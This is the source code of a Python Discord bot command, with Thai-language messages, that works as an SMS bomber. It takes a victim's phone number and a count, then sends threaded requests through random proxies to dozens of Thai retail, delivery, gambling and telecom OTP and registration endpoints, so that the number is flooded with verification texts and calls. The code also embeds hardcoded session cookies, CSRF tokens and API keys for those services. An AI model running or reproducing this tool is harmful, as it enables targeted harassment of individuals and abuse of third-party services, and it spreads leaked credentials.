...
import discord, requests, threading
import nextcord
    ...
    async def sms(ctx,phone,amount: int):
        ...
        if ctx.channel.id == channelid:
                if amount < limit+1:
                    ...
                    await ctx.send(f"** # __เบอร์  📵     : ||{phone}||__ \nสถานะ  :envelope_with_arrow:     : กำลังโจมตี ⚡ \nเป็นเวลา  :bar_chart:  :__{amount} วินาที__ **", delete_after=5)

                    def trueh():
                        try:
                            httpx.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}",proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def cnp1():
                        try:
                            response = requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp3():
                        try:
                            response = requests.post("https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp5():
                        try:
                            response = requests.post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp7():
                        try:
                            response = requests.post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def cnp9():
                        try:
                            response = requests.post('https://api.sacasino9x.com/api/RegisterService/RequestOTP', headers=header, json={"Phone":phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp10():
                        try:
                            response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp11():
                        try:
                            response = requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp13():
                        try:
                            response = requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp15():
                        try:
                            response = requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp16():
                        try:
                            response = httpx.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp17():
                        try:
                            response = httpx.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp21():
                        try:
                            response = httpx.post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def cnp23():
                        try:
                            response = requests.post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp24():
                        try:
                            response = requests.post(url="https://www.tgfone.com/index.php/signin/otp_chk", data={"mobile":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp25():
                        try:
                            response = requests.post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp26():
                        try:
                            response = requests.post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp27():
                        try:
                            response = requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}",proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def cnp28():
                        try:
                            response = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def cnp29():
                        try:
                            response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def cnp30():
                        try:
                            response = requests.post("https://www.berlnw.com/reservelogin", data={"p_myreserve": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def cnp31():
                        try:
                            response = requests.post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def cnp32():
                        try:
                            response = requests.post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def x1():
                        try:
                            response = requests.post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers= header,proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def x2():
                        try:
                            response = requests.post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=header,proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def x8():
                        try:
                            response = requests.post('https://api2.1112.com/api/v1/otp/create', data = {'phonenumber': phone, 'language': "th"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def x9():
                        try:
                            response = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def x10():
                        try:
                            response = requests.post('https://rapidapi.com/blaazetech/api/spam-caller-check/',json={"phonenumber":phone,"language":"th"},headers=header,proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api1():
                        try:
                            response = requests.post("https://m.thisshop.com/cos/send/code/notice", json={"sessionContext":{"channel":"h5","entityCode":0,"userReferenceNumber":"12w12y11r52gz259ue14rr7g7370239m","localDateTimeText":"20220115182850","ricnpMessage":"{}","serviceCode":"FLEX0001","superUserId":"sysadmin","tokenKey":"149d5c7bae10304c8aba0da2bbc59cb7","authorizationReason":"","transactionBranch":"TFT_ORG_0000","userId":"","locale":"th-TH"},"noticeType":1,"businessType":"RT0001","phoneNumber":f"66-{phone}"},headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api2():
                        try:
                            ...
                            response = requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0",proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass  
                    def api4():
                        try:
                            response = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api5():
                        try:
                            response = requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api6():
                        try:
                            response = requests.post("http://b226.com/x/code", data={f"phone":phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api8():
                        try:
                            response = requests.post("https://api.mcshop.com/cognito/me/forget-password",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"username": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api9():
                        try:
                            response = requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register",proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api10():
                        try:
                            response = requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api11():
                        try:
                            response = requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api12():
                        try:
                            response = requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone":"66"+phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api14():
                        try:
                            response=requests.post('https://www.msport1688.com/auth/otp_sender', headers=header, data={"phone": phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api16():
                        try:
                            response = requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api18():
                        try:
                            response = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api19():
                        try:
                            response = requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}",proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api20():
                        try:
                            response = requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api22():
                        try:
                            response = requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api23():
                        try:
                            response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api25():
                        try:
                            response = requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api27():
                        try:
                            response = requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone,proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api28():
                        try:
                            response = requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api29():
                        try:
                            response = requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": phone},headers=header,proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api30():
                        try:
                            response = requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api31():
                        try:
                            response = requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": phone,"password":"123456789Az"},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api33():
                        try:
                            ...
                            response = requests.get(f"https://laopun.com/send-sms?id={phone}&otp=5153",headers=head,proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api34():
                        try:
                            response = requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api35():
                        try:
                            ...
                            response = requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head, json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api36():
                        try:
                            ...
                            response = requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api37():
                        try:
                            response = requests.post("https://icq.com/smscode/login/en", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"th","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api38():
                        try:
                            response = requests.post("https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber': phone,'language': "th"},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api40():
                        try:
                            ...
                            response = requests.post("https://graph.firster.com/graphql",headers=headers,json=json,proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api41():
                        try:
                            response = requests.post("https://m.riches666.com/api/register-otp", data={"brands_id":"60a6563a232a600012521982","agent_register":"60a76a7f233d2900110070e0","tel":phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api42():
                        try:
                            ...
                            response = requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api43():
                        try:
                            ...
                            response = requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers=head,json={"msisdn":phone,"function":"enroll"},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def api44():
                        try:
                            ...
                            response = requests.post("https://ufa108.ufabetcash.com/api/",headers=header,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}",proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                                
                    def api48():
                        try:
                            response = requests.post("https://m.pgwin168.com/api/register-otp",json ={"brands_id":"60e4016f35119800184f34a5","agent_register":"60e57c3b2ead950012fc5fba","tel": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api49():
                        try:
                            response = requests.post("https://www.som777.com/api/otp/register",json ={"applicant": phone,"serviceName":"SOM777"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    def api50():
                        try:
                            response = requests.post("https://www.konglor888.com/api/otp/register",json = {"applicant": phone,"serviceName":"KONGLOR888"},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def apicall():
                        try:
                            requests.post("https://www.theconcert.com/rest/request-otp",headers={"User-Agent": useragent},data={'mobile': f"{phone}", 'country_code': "TH", 'lang': "th", 'channel': "call", 'digit': '4'},proxies={'http': 'http://' + random.choice(s)})
                        except:pass
                    def newa():
                        try:
                    ...
                    def newa1():
                        try:
                            requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def newa6():
                        try:
                            requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",data=f"phone={phone}&type=1",headers={"content-type":"application/x-www-form-urlencoded;charset=UTF-8","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    
                    def newa7():
                        try:
                            requests.post("https://play.gkingbet.com/api/register/sms",json={"phone":phone,"agent_id":66,"country_code":"TH"},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def newa9():
                        try:
                            requests.post("https://api.thaisme.one/smegp/register/request-otp",headers={
                                ...
                                },json={"MOBILE":phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def newa10():
                        try:   
                            requests.post("https://api.sa.game/api/Account/SendRegisterVerificationSms",headers={
                                ...
                                },data={"countryId":66,"phoneNumber":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def newa11():
                        try:
                            requests.post("https://ufaclub99.com/member/Register/Request_OTP",headers={
                                ...
                                },data=f"phonetxt={phone}",proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def newa13():
                        try:
                            requests.post("https://ufa8.co/register",headers={
                                ...
                                },data=f"register=1&phone={phone}&password=Kan064402&password2=Kan064402&line=Garenarov",proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def newa15():
                        try:
                            requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}",proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def newa32():
                        try:
                            requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%R3.mnux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":66},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def newa33():
                        try:
                            requests.post("https://mapi.konglor888.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"konglor888.com"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    
                    def newa34():
                        try:
                            requests.post("https://mapi.hit789.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"hit789.com"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                        
                    def newa35():
                        try:
                            requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":f"{phone}","function":"enroll"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                        
                    def newa36():
                        try:
                            requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",json={"applicant":f"{phone}","serviceName":"fox888.com"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                        
                    def newa37():
                        try:
                            requests.post("https://api.1112delivery.com/api/v1/otp/create",headers=header,json={"phonenumber": phone,"language": "th"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                        
                    def newa38():
                        try:
                            requests.post("https://mapi.dung919.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"dung919.com"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    
                    def ig_token():
                        d=requests.get("https://www.instagram.com/",headers=headers).headers['set-cookie']
                    ...
                    def newa42():
                        try:
                            ...
                            requests.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone,proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def icq():
                        try:
                            requests.post(f"https://u.icq.net/api/v86/rapi/auth/sendCode", headers=ha , json={"reqId": "85174-1664860517","params": {"phone": f"66{phone}","language": "en-US","route": "sms","devId": "ic1rtwz1s1Hj1O0r","application": "icq"}},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def fillgoods():
                        try:
                            requests.post(f"https://fgproduction.api-fillgoods.com/user/send-otp",headers=ha,json={"phone_number": phone,"email": f"{token_hex(8)}1@gmail.com"},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass
                    
                    def big666():
                        try:
                            requests.post("https://big666.com/api/register-otp",headers=ha,json={"brands_id": "62626d6dd8db2d0012eaa37f","tel": phone,"token": 'null'},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def sfbet88():
                        try:
                            requests.post("https://www.sfbet88.com/service/mobile/check",headers=ha,json={f"phoneNumber": phone},proxies={'http': 'http://' + random.choice(s)})
                            
                        except:pass

                    def gettgo():
                        try:
                            requests.post("https://gettgo.com/sessions/otp_for_sign_in",headers=ha, data={"mobile_number":phone},proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def highzy1():
                        try:
                            r = httpx.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":phone,"provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
                        except:pass
                    def highzy2():
                        headers = {
                        "Host": "shopgenix.com",
                        ...
                        try:
                            httpx.post("https://shopgenix.com/api/sms/otp/",headers=headers,data=f"mobile_country_id=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
                        except:pass
                    def highzy3():
                        try:
                            httpx.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
                        except:pass
                    def highzy4():
                        try:
                            httpx.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})
                        except:pass
                    def highzy5():
                        try:
                            httpx.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",json={"mobile_phone_no": phone},headers={"Content-Type": "application/json"},proxies={'http': 'http://' + random.choice(s)})
                        except:pass
                    def highzy6():
                        try:
                            httpx.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}",proxies={'http': 'http://' + random.choice(s)})
                    ...
                    def highzy7():
                        try:
                            httpx.post(f"https://api-sso.ch3plus.com/user/request-otp", json={"phonenumber":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})
                        except:pass
                    def highzy8():
                        try:
                    ...
                    def highzy10():
                            try:
                                httpx.post(f"https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber':f"{phone}",'language': "th"},proxies={'http': 'http://' + random.choice(s)})
                            except:pass
                    ...
                    for i in range(amount):
                        ...
                        threading.Thread(target=highzy1).start()
                        threading.Thread(target=highzy2).start()
                        threading.Thread(target=highzy3).start()
                        threading.Thread(target=highzy4).start()
                        threading.Thread(target=highzy5).start()
                        threading.Thread(target=highzy6).start()
                        threading.Thread(target=highzy7).start()
                        threading.Thread(target=highzy8).start()
                        threading.Thread(target=highzy9).start()
                        threading.Thread(target=highzy10).start()
                    
                    await ctx.send(f"> # ยิงไปที่ ||{phone}|| เสร็จแล้วครับ! <@{ctx.message.author.id}>", delete_after=10)
                else:
                    await ctx.send(f"> ** # <@{ctx.message.author.id}> ใส่ไม่เกิน {limit} นะครับ :**)", delete_after=10)
        else:
            await ctx.send(f"** # __ใช้ผิดห้องนะครับ! <@{ctx.message.author.id}> กรุณาใช้คำสั่งห้องนี้นะครับ <#{channelid}>__ **", delete_after=5)
